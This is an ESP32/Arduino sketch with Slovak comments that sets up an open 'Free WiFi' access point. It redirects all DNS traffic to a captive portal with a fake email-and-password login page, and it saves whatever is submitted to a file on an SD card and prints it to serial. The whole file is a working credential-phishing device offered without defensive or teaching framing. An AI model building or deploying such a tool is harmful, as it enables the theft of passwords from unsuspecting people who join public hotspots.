#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <FS.h>
#include <SD.h>
#include <SPI.h>

// Konfigurácia siete
#define SSID_NAME "Free WiFi"
IPAddress APIP(172, 0, 0, 1);  
const byte DNS_PORT = 53;      

// SD karta - SPI piny
#define SD_CS 5  // Pin pre CS (Chip Select)

// Inicializácia serverov
DNSServer dnsServer;
WebServer webServer(80);

// HTML hlavička pre webové stránky
String header(String title) {
  String css = "body { font-family: Arial, sans-serif; text-align: center; background-color: #f8f8f8; color: #333; padding: 20px; }"
               "input { width: 100%; padding: 8px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; }"
               "button { background-color: #007bff; color: white; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer; }"
               "button:hover { background-color: #0056b3; }";
  return "<!DOCTYPE html><html><head><title>" + title + "</title><meta name='viewport' content='width=device-width, initial-scale=1'><style>" + css + "</style></head><body><h1>" + title + "</h1>";
}

// Ukladanie údajov do SD karty
void saveCredentials(String email, String password) {
  File file = SD.open("/data.txt", FILE_APPEND);
  if (file) {
    file.println("Email: " + email + ", Password: " + password);
    file.close();
    Serial.println("Údaje uložené do data.txt.");
  } else {
    Serial.println("Chyba: Nepodarilo sa otvoriť data.txt.");
  }
}

// Spracovanie prihlasovacieho formulára
void handlePost() {
  String email = webServer.arg("email");
  String password = webServer.arg("password");

  if (email.length() > 0 && password.length() > 0) {
    Serial.println("Nové prihlásenie:");
    Serial.println("Email: " + email);
    Serial.println("Heslo: " + password);

    // Uloženie do SD karty
    saveCredentials(email, password);
    webServer.send(200, "text/html", header("Úspech") + "<p>Údaje boli prijaté a uložené!</p></body></html>");
  } else {
    webServer.send(400, "text/html", header("Chyba") + "<p>Prosím, zadajte platné údaje!</p></body></html>");
  }
}

// Hlavná stránka pre Captive Portal
void handleRoot() {
  webServer.send(200, "text/html", header("Prihlásenie") + 
    "<form method='post' action='/post'>"
    "<label>Email:</label><input type='text' name='email' required><br>"
    "<label>Password:</label><input type='password' name='password' required><br>"
    "<button type='submit'>Prihlásiť sa</button></form></body></html>");
}

void setup() {
  Serial.begin(115200);

  // Inicializácia SD karty
  if (!SD.begin(SD_CS)) {
    Serial.println("Chyba: SD karta sa nepodarila pripojiť!");
    while (1);
  }
  Serial.println("SD karta úspešne inicializovaná.");

  // Nastavenie Wi-Fi AP
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(SSID_NAME);
  Serial.println("Access Point '" + String(SSID_NAME) + "' spustený.");

  // DNS presmerovanie (Captive Portal)
  dnsServer.start(DNS_PORT, "*", APIP);

  // Nastavenie webového servera
  webServer.on("/", handleRoot);
  webServer.on("/post", HTTP_POST, handlePost);

  // Presmerovanie na hlavnú stránku pre akúkoľvek požiadavku
  webServer.onNotFound(handleRoot);

  webServer.begin();
  Serial.println("Webserver spustený.");
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
}
